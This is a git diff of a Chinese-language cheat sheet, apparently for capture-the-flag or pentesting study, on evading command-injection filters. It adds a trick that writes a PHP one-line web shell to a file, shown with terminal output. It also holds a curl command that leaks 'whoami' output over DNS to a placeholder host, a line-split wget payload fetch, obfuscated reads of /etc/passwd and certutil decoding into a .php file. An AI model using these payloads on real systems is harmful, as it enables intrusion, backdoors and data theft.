@@ -25,10 +25,9 @@ a=l;b=s;$a$b 局部变量
 curl `whoami`xxxx.xxx DNS管道解析
 ```
 
-### some Trick
+### 利用 \ 换行符
 
 ```bash
-
 1>wget\
 
 1>xxx.com.\
@@ -41,13 +40,42 @@ curl `whoami`xxxx.xxx DNS管道解析
 
 1>ll.p\
 
-1>p
-
-ls -t>a
-
-sh a
-
+1>hp
 ```
+
+
+
+### 利用 > 重定向
+
+这里我们首先新建一个文件名字为你要执行的命令 我们来拿uname -a 来做例子
+
+`touch unman\ -a`
+
+然后将ls的结果重定向到一个临时变量a 
+
+最后去运行它
+
+`sh a`
+
+最终就会得到 uname -a的执行结果
+
+试想一下，如果我们将ls运行的结果展示为写入一句话木马的命令 再去运行sh a 就可以得到一个木马，虽然用处不大。
+
+```shell
+hacked@sinfvnction$ touch echo\ \'\<\?php\ eval\(\$_POST\[a\]\)\?\>\'\>\>2.php
+
+hacked@sinfvnction$ ls > a
+
+hacked@sinfvnction$ ls
+2.php			a			echo '<?php eval($_POST[a])?>'>>2.php
+
+hacked@sinfvnction$ cat 2.php
+<?php eval($_POST[a])?>
+```
+
+
+
+---
 
 `ls -t`是按照时间顺排序
 
@@ -160,7 +188,8 @@ cat$IFS$9flag
 %00 %20
 ```
 
-## 其他绕过
+### 其他绕过
+
 ```bash
 cat$u /etc$u/passwd$u
 
@@ -178,15 +207,15 @@ cat$u /etc$u/passwd$u
 Windows
 
 ```
-echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 >hex.txt
+echo 48 65 6C 6C 6F 2C 57 6F 72 6C 64 21 >c.txt
 
-生成 hex.txt，机器码对应的内容是 Hallo World!
+生成 hex.txt，机器码对应的内容是 Hello World!
 
-certutil -decodehex hex.txt bin.txt
+certutil -decodehex c.txt c.php
 
 也可以base64解码
 
-certutil -decode hex.txt bin.txt
+certutil -decode c.txt c.php
 ```
 
 Linux
